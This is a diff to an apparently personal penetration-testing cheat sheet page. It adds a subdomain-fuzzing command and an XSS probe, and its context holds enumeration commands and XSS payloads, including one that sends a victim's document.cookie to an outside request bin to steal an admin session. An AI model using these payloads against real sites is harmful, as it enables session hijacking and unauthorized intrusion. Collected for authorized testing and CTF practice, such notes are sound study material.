@@ -213,11 +213,15 @@ font-size: 1.3em;
 <summary > &nbsp; &nbsp;  ➜  Check Code Source : </summary>
   <p class="command" > 'Ctrl+U' </p>
 </details>
-    <details >
+<details >
+<summary > &nbsp; &nbsp;  ➜  Check Subdomain : </summary>
+  <p class="command" > wfuzz -c -z file,/path/wordlist --hc 400  -H 'Host:FUZZ. X.X.X.X'  http://url.com </p>
+</details>
+  <details >
 <summary > &nbsp; &nbsp;  ➜  URL Scanning : </summary>
   <p class="command" ># dirb 'url' </p>
   <p class="command"># nikto -h 'url' </p>
-   <p class="command" ># gobuster 'url' </p>
+   <p class="command" ># gobuster dir 'url' 'wordlist' </p>
    <p class="command"> # ffuf -c -w /path/list -u 'url/FUZZ' </p>
 </details>
     <details >
@@ -235,6 +239,7 @@ font-size: 1.3em;
 <summary > &nbsp; &nbsp;  ➜  XSS :  </summary>
   <p class="command" > < scrīpt> alert("test")< /script> </p>
   <p class="command" > < scrīpt> alert(document.cookie)< /script> </p>
+  <p class="command" > <img src=http://X.X.X.X:8000/xss.test /> </p>  
   <p> Steal Admin cookie via XSS </p>
   <p class="command"> <scrīpt>document.location=`https://postb.in/b/1234?c=`+document.cookie;< /script> </p>
   <p> Capture HTTP Requests : </p>
